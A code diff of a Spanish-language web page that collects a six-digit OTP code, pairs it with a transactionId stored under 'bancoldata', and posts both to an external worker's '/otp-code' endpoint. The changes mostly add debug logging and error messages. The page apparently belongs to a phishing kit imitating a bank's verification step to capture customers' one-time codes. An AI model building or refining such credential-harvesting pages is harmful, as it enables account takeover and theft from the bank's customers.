@@ -435,27 +435,36 @@
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 const transactionId = bancoldata.transactionId;
 
+                console.log('📦 Datos del localStorage:', bancoldata);
+
                 if (!transactionId) {
-                    alert('Error: Sesión no encontrada');
+                    console.error('❌ No hay transactionId en localStorage');
+                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
                     window.location.href = 'index.html';
                     return;
                 }
 
                 console.log('📤 Enviando código OTP:', token);
                 console.log('🆔 TransactionId:', transactionId);
-                console.log(`📡 Worker URL: ${WORKER_URL}`);
+                console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
 
                 // Enviar al endpoint /otp-code del worker
                 const response = await fetch(`${WORKER_URL}/otp-code`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
                     body: JSON.stringify({ 
                         transactionId: transactionId,
                         otp: token 
                     })
                 });
 
+                console.log('📊 Status de la respuesta:', response.status);
+
                 const result = await response.json();
+                console.log('📦 Respuesta del worker:', result);
 
                 loadingOverlay.style.display = 'none';
 
@@ -471,10 +480,10 @@
                 }
 
             } catch (err) {
-                console.error('❌ Error:', err);
+                console.error('❌ Error detallado:', err);
                 loadingOverlay.style.display = 'none';
                 mostrarErrorCajas();
-                mostrarAlerta();
+                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.');
             }
         }
 
@@ -485,7 +494,6 @@
                 this.value = this.value.slice(0, 6);
             }
             updateButton();
-            // ❌ SIN AUTO-ENVÍO
         });
 
         button.addEventListener('click', function(e) {
@@ -493,7 +501,7 @@
             enviarCodigo();
         });
 
-        // Teclado físico (solo números y backspace)
+        // Teclado físico
         document.addEventListener('keydown', function(e) {
             if (e.key >= '0' && e.key <= '9') {
                 if (input.value.length < 6) {
@@ -522,6 +530,10 @@
         // ==================== INICIALIZAR ====================
         updateButton();
         setTimeout(() => input.focus(), 300);
+
+        // Verificar si hay transactionId al cargar
+        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        console.log('🔍 TransactionId al cargar:', bancoldata.transactionId || 'No encontrado');
 
         console.log('🚀 Sistema de validación listo');
         console.log(`📡 Worker URL: ${WORKER_URL}`);
